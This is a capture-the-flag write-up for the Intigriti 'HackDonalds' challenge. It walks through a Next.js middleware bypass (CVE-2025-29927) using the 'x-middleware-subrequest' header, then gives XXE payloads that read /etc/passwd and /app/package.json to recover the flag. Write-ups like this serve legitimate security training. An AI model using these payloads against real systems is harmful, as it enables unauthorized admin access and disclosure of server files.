---
title: Intigriti Challenge - HackDonalds
date: 2025-04-25
tags: [bug bounty, challenge, ctf]
categories: [Bug Bounty, CTF Writeups]
author: 2Fa0n
img_path: /assets/img/intigriti-challenge-hackdonalds
image: /assets/img/intigriti-challenge-hackdonalds/intigriti_banner.png
---

# Intigriti Challenge - HackDonalds 🍔
**Author:** Basetin, CryptoCat <br>
**Target:** [HackDonalds 🍔](https://hackdonalds.intigriti.io)

## Description
Find the FLAG 🚩

## Solution
After going through the website, we can see there just a simple Donalds homepage and food menu. <br>

![image](/assets/img/intigriti-challenge-hackdonalds/intigriti_1.png)
![image](/assets/img/intigriti-challenge-hackdonalds/intigriti_2.png)

When we click at the `ADMIN` button, we see a login form with `secret sauce password`. <br>

![image](/assets/img/intigriti-challenge-hackdonalds/intigriti_3.png)

After enter some common credentials, we can not login to admin panel. Let's check the tech stack of the website. <br>

![image](/assets/img/intigriti-challenge-hackdonalds/intigriti_4.png)

We found `Next.js 13.2.0` and checking twitter found a really interesting blog about [CVE-2025-29927](https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware), which is a critical vulnerability in Next.js from `11.1.4` up to `15.1.7` which allows middleware bypass with a specific header `x-middleware-subrequest`.

Let's exploit this with `x-middleware-subrequest` header. We need to a following header into our request: `x-middleware-subrequest: middleware`. <br>
Go to `Burp Suite settings` and look for `HTTP match and replace rules` and add a new rule:

![image](/assets/img/intigriti-challenge-hackdonalds/intigriti_5.png)
![image](/assets/img/intigriti-challenge-hackdonalds/intigriti_6.png)

After that, we can refresh and see the admin panel. <br>

![image](/assets/img/intigriti-challenge-hackdonalds/intigriti_7.png)

When we click on to these 4 super secret admin area, we can only click to `Ice Cream Machines` and redirect us to `/ice-cream-machines` page. <br>

![image](/assets/img/intigriti-challenge-hackdonalds/intigriti_8.png)

Then we `View Settings` and see a `XML Configuration Settings` file. <br>

![image](/assets/img/intigriti-challenge-hackdonalds/intigriti_9.png)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<machine>
  <id>1</id>
  <name>Ice Cream Machine</name>
  <temperature>-18</temperature>
  <mixLevel>75</mixLevel>
  <lastMaintenance>2025-03-15</lastMaintenance>
  <cleaningSchedule>Daily</cleaningSchedule>
</machine>
```

Normally when facing the XML file, we can think about the `XXE` vulnerability. <br>
Let's try some payload to test information disclosure. <br>
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE machine [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<machine>
  <id>1</id>
  <name>&xxe;</name>
  <temperature>-18</temperature>
  <mixLevel>75</mixLevel>
  <lastMaintenance>2025-03-15</lastMaintenance>
  <cleaningSchedule>Daily</cleaningSchedule>
</machine>
```

![image](/assets/img/intigriti-challenge-hackdonalds/intigriti_10.png)

We are able to retrieve the `/etc/passwd` file. <br>
Hmm, so how to read the flag? <br>
After searching on google, we found a [Project Structure and organization](https://nextjs.org/docs/app/getting-started/project-structure) in `Next.js`. We go through and found flag in `/app/package.json` file. <br>

![image](/assets/img/intigriti-challenge-hackdonalds/intigriti_11.png)
![image](/assets/img/intigriti-challenge-hackdonalds/intigriti_12.png)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE machine [
  <!ENTITY xxe SYSTEM "file:///app/package.json">
]>
<machine>
  <id>1</id>
  <name>&xxe;</name>
  <temperature>-18</temperature>
  <mixLevel>75</mixLevel>
  <lastMaintenance>2025-03-15</lastMaintenance>
  <cleaningSchedule>Daily</cleaningSchedule>
</machine>
```

![image](/assets/img/intigriti-challenge-hackdonalds/intigriti_13.png)

There we go the flag in `package.json` which is a common file in Node. <br>

**Flag:** `INTIGRITI{XXE_1n_Ic3Cr34m_M4ch1n3s}`